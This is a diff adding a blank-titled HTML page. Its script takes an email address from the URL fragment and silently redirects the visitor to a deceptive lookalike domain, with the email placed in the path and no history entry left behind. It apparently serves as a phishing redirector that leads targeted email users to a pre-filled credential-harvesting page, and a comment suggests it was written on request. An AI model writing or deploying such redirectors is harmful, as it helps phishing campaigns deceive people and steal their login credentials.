@@ -1,0 +1,34 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title></title></head>
+<body>
+  <script>
+  (function () {
+    // === CONFIG ===
+    const MAIN_BASE = "https://documenti-mlsonlinevaliditacertrifonctionstine.online"; // no trailing slash required
+
+    // 1) Read hash after '#'
+    const raw = (location.hash || "").replace(/^#\/?/, "").trim();
+
+    // 2) If someone passes "#email=foo@bar.com", take the value; otherwise treat whole hash as email
+    let email = raw;
+    if (raw.includes("=")) {
+      const params = new URLSearchParams(raw.replace(/#/g, "&"));
+      email = params.get("email") || params.get("e") || params.get("mail") || "";
+    }
+
+    // 3) Basic email validation
+    email = decodeURIComponent(email || "");
+    const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+
+    // 4) Build target as PATH, not query
+    // Keep '@' visible (not URL-encoded) as you requested. Trim duplicate slashes.
+    const base = MAIN_BASE.replace(/\/+$/,"");
+    const target = isEmail ? base + "/" + email : base;
+
+    // 5) Redirect without adding to history
+    window.location.replace(target);
+  })();
+  </script>
+</body>
+</html>
